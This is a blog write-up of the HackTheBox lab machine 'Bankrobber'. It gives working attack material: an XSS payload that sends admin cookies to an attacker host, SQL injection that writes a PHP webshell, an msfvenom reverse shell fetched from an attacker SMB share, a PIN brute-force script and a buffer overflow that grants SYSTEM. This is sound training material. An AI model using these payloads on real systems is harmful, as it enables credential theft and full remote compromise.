---
layout: post
title: Bankrobber
subtitle: Bankrobber HackTheBox
cover-img: /assets/img/htb-bg.png
thumbnail-img: /assets/img/BankRobber_Big.png
share-img: /assets/img/Bankrobber_Release.jpg
tags: [XSS, Client-Side, SQLi, Buffer Overflow,  Windows]
categories: HackTheBox
comments: true
---
<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Bankrobber_Release.jpg?raw=true" class="mx-auto d-block" unselectable="on" />
Bankrobber is an insane level box on HackTheBox that utilizes a client side attack and SQL injection and a simple buffer overflow. User was lengthy as it required a lot of waiting and inconsistency, but the path of System was very quick and simple.

## Walkthrough

### Recon

An nmap scan, followed by a full port and script scan, reveal the following ports are open:

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: E-coin
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 14m35s, deviation: 0s, median: 14m35s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-24T00:21:50
|_  start_date: 2021-12-24T00:19:39
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

The MariaDB server is unable to be accessed by our machine, and the SMB server requires authentication. Accessing the HTTP and HTTPS webservers both show the same website; some cryptocurrency website with a login and registration page. Running a gobuster scan with `gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://bankrobber.htb/ ` doesn't return anything interesting except a `phpmyadmin` which is only accessible by the local network.

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Bankrobber_1.PNG?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

I tried to use SQL injection to bypass the login page but that didn't work. When registering a user, a message pops up at the top of the page and I tried injecting PHP code into that, but there was no success. 

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Bankrobber_2.PNG?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

I ended up registering as a user and noticed two intersting things. First, in my cookies, my username, password, and user id were stored  encoded with Base64 and URL. Secondly, as a user, I could create a transaction; what was more interesting was the fact that I could include a comment in my transaction, and that it would be manually reviewed.

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Bankrobber_3.PNG?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

### XSS

Since my input is being manually reviewed, I thought about trying some Cross Site Scripting (XSS). I essentially created a malicious payload to use as the comment that would try to load an image that would be sourced back to an HTTP server I was hosting. The payload looked like this:

```
<img src="A" onerror="this.src='http://10.10.16.6/nonexistant.png'+document.cookie;" />
```

I first set up a python server on port 80 to catch the callback. What the payload actually does is try to render an image from the source "A", but since "A" is not a valid image source, the onerror property is put into play. The onerror property is written such that it attempts to redirect the viewer (the admin) to the listed url, with the cookies of the viewer also being attached to the url. You can't simply render an image from a url and add javascript to it, you have to use the onerror tag as a workaround. After waiting a bit, my listener catches the following:

```
┌──(root💀kali)-[/home/kali]
└─# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.154 - - [25/Dec/2021 20:55:31] code 404, message File not found
10.10.10.154 - - [25/Dec/2021 20:55:31] "GET /nonexistant.pngusername=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 404 -
10.10.10.154 - - [25/Dec/2021 20:55:31] code 404, message File not found
10.10.10.154 - - [25/Dec/2021 20:55:31] "GET /nonexistant.pngusername=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 404 -
```

The XSS worked, and I can see the cookies were attached. Note that the payload may or may not work, and there is a large variation in the time it takes for it to load. This is a problem with the box and not the payload. After decoding the URL and Base64 encoding, the credentials for the admin are: `admin:Hopelessromantic`. Using them to log into the website, I see three interesting things: notes.txt, a user id lookup, and a "Backdoorchecker"

```
notes.txt contents
- Move all files from the default Xampp folder: TODO
- Encode comments for every IP address except localhost: Done
- Take a break..
```

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Bankrobber_4.PNG?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

What I can take from this is the following: there is potential SQL injection since the "Search users" function seems to pull usernames associated with ids from a database. There is also potentially some command injection that can be done with the Backdoorchecker. Lastly, based on notes.txt, I can assume that the directory for this admin page is something along the lines of `C:\xampp\htdocs\`. The first thing I want to look into is the SQL injection. After running a small payload, `3' OR password = 'Hopelessromantic' ;--#`, I can confirm there is SQL injection.

<img src="https://github.com/susMdT/secondsite.github.io/blob/master/assets/img/Bankrobber_5.PNG?raw=true" class="postImagecontent" width="100%" height="100%" unselectable="on" />

### SQL Injection

My assumption was that there was some statement along the lines of `select username from users where id = '<user input>'`, and my injection changed the query to select any username where the id was 3 or the password was "Hopelessromantic" (the admin's). Since a user and the admin was returned, this confirms SQL injection. I used some UNION payloads to enumerate the database and found out that I was running as the root user for MySQL. 

```
' UNION SELECT 1,1,1;#
└─there are three tables in this database. I had to experiment with the number of 1's in my UNION statement
' UNION SELECT 1,group_concat(table_name),1 from information_schema.tables where table_schema=database();#
└─the three tables are: balance,hold,users
' UNION SELECT 1,user(),1 from users;# --> root@localhost
└─The choice of using users as a table was arbitrary, anything could have worked.
' UNION SELECT ALL GRANTEE,PRIVILEGE_TYPE,1 from information_schema.user_privileges;# --> FILE
└─based on previous injections, the first two values in the UNION statement are reflected.
```

The FILE privilege allows us to write and read files under the context of whoever is running the SQL service. Since this web server is running PHP and we know, based on notes.txt, that the default webroot is being used, we can write a PHP webshell with the following SQL query: `' UNION ALL SELECT  "<?php system($_REQUEST['cmd']); ?>",2,3 INTO OUTFILE 'c:/xampp/htdocs/shell.php' ;#` (Note that forward slashes are being used instead of  backslash despite the fact this is Windows; SQL is weird). However, this fails with an ambiguous return of `There is a problem with your SQL syntax`. There isn't anything wrong with the syntax, so the error probably has to do with permissions regarding writing to the directory. However, if we're the SQL user, we can probably write to the directory of phpmyadmin using the payload `' UNION ALL SELECT  "<?php system($_REQUEST['cmd']); ?>",2,3 INTO OUTFILE 'c:/xampp/phpmyadmin/shell.php' ;#`, and this works.

### XSS  to SSRF

While we have a webshell that passes system commands through GET requests, we cannot just access it. Remember, the phpmyadmin directory is restricted to localhost. But we have the automated admin user who can perform our GET requests for us, because they are accessing the links from the machine (also, if we captured with the traffic using netcat instead of a python web listener, we could see that)

```
┌──(root💀kali)-[/home/kali]
└─# nc -nvlp 80                               
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:49704.
GET /nonexistant.pngusername=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.16.3

Notice the localhost in the Referer header
```

To pass in commands, we are going to simply modify our XSS payload to send two GET requests to our webshell at `http://bankrobber.htb/phpmyadmin/shell.php`. The first one will copy the payload from our SMB share and the second one will execute it.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe > shell.exe
smbserver.py share . -smb2support
<img src="A" onerror="this.src='http://localhost/phpmyadmin/shell.php?cmd=copy+\\\\10.10.16.6\\share\\shell.exe'" />
<img src="A" onerror="this.src='http://localhost/phpmyadmin/shell.php?cmd=c:\\xampp\\phpmyadmin\\shell.exe'" />
rlwrap nc -nvlp 4444

I sent both img elements in one payload and clicked "Transfer E-COIN" multiple times.
```

First is the payload creation (I am assuming it is a 64 bit system), then I host a SMB server so I can copy the payload into the target. Then I send my XSS payload to make the admin user create two GET requests to the webshell that passes an argument causing a system call to the payload. Lastly, I set up a listener to catch the callback. Note that just like the initial XSS, the payload can take some time to process and multiple attempts may be necessary due to the inconsistent way the computer automates its  checks.

### Privilege Escalation

```
┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444              
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:49974.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\xampp\phpMyAdmin>
```

And our shell is returned to us. We are capable of running enumeration commands, such as `netsh advfirewall show allprofiles`, `systeminfo`, `tasklist /v`, and `netstat -ano`. The most interesting thing to me, aside the Dutch language on the box, is how port 910 is being used despite not showing up on the nmap scan, and the weird "bankv2.exe" in the root directory that isn't readable or executeable. Checking the process id with `tasklist /v` and `netstat -ano`, we can see that the binary is doing something on port 910.

```
C:\xampp\phpMyAdmin>tasklist /v
Image Name                     PID
========================= ========
bankv2.exe                    1656

C:\xampp\phpMyAdmin>netstat -ano
Proto  Local Address          Foreign Address        State           PID 
TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1656

```

To interact with it, we will port forward using chisel. I will create a chisel server on my Kali machine that listens on port 8000, drop the binary on the machine, and then create a client connection that forwrads my Kali's 4000 port to the machine's 910.

```
┌──(root💀kali)-[/home/kali]
└─# chisel server -p 8000 --reverse
2021/12/26 04:11:10 server: Reverse tunnelling enabled

C:\xampp\phpMyAdmin>copy \\10.10.16.3\share\chisel64 chisel.exe
C:\xampp\phpMyAdmin>chisel.exe client 10.10.16.3:8000 R:4000:127.0.0.1:910

```

We can check that a successful forwarding was made by checking our Kali machine and attempting to communicate with the port using netcat.

```
┌──(root💀kali)-[/home/kali]
└─# netstat -tulpn  | grep 4000               
tcp6       0      0 :::4000                 :::*                    LISTEN      6616/chisel         

┌──(root💀kali)-[/home/kali]
└─# nc localhost 4000          
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 

```

It appears this service takes in some 4 digit PIN code. I tried entering a string of text and a very long number, but this service didn't react. Since the PIN is only 4 digits, this can be easily brute forced with a python script.

```
import socket
                                                         
for i in range(0000,9999):                                                                                         
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                       
    sock.connect(('localhost', 4000))
    sock.recv(8192)                                                                                                
    sock.send(f"{i:04}\n".encode())                                                                                
    data = sock.recv(8192)                                                                                         
    if not b"Access denied" in data:
        print(f"{i:04}")      
        break
    sock.close()
```

This script iterates from 0000 to 9999, sending data to our port 4000 of at max 8192 bytes. This data is an encoded, formatted string such that it is at least 4 digits long with preceding zeros (so our data will look like 0001, 0002, etc.). It is also encoded to UTF-8 so the host machine can read it correctly (python by default has strings stored as unicode). The script also sends a newline to mimic how we press enter to send our data after typing it out. Lastly, the script will receive the data and check if the error message is there; if it is, it keeps going, and if isn't, the correct PIN is printed and the script stops. After running it, we find our PIN is 0021.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Bankrobber]
└─# python3 script.py       
0021
┌──(root💀kali)-[/home/kali/HackTheBox/Bankrobber]
└─# 
```

After entering the correct PIN, we are presented with the following

```
┌──(root💀kali)-[/home/kali/HackTheBox/Bankrobber]
└─# nc localhost 4000
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 
```

After playing around with it, it seems to call an executeable after specifying an input value. We can try to overflow this by first creating a string with unique patterns with `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500` and then sending this in.

```
┌──(root💀kali)-[/home/kali/HackTheBox/Bankrobber]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

┌──(root💀kali)-[/home/kali/HackTheBox/Bankrobber]
└─# nc localhost 4000                                                     
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
 [$] Transaction in progress, you can safely disconnect...
```

It seems we have a simple buffer overflow. After a certain point, the string overrites the executable being called. We can find this point by using `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0Ab1`. This finds the offset based on a unique 4 byte string. It returns 32, so after we put in 32 characters, we just specify the path to our payload we dropped to get initial access.

```
┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444

┌──(root💀kali)-[/home/kali/HackTheBox/Bankrobber]
└─# nc localhost 4000                                                     
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\xampp\phpmyadmin\shell.exe
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\xampp\phpmyadmin\shell.exe using our e-coin transfer application.
 [$] Executing e-coin transfer tool: C:\xampp\phpmyadmin\shell.exe
 [$] Transaction in progress, you can safely disconnect...
 
┌──(root💀kali)-[/home/kali]
└─# rlwrap nc -nvlp 4444
Ncat: Connection from 10.10.10.154.
Ncat: Connection from 10.10.10.154:50224.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

C:\Windows\system32>whoami
nt authority\system
```

And we got System. Big.

## Afterthoughts

This box was pretty fun because of the XSS being a unique attack vector for me. I always knew how it worked, I just never got to utilize it. However, it was very annoying how inconsistent the box was when checing the transactions and executing my XSS payload. Root was a bit disappointing since it was very simple. However, overall the combination of XSS, SQL injection, Port forwarding, and a Buffer Overflow made this box interesting and quite fun.
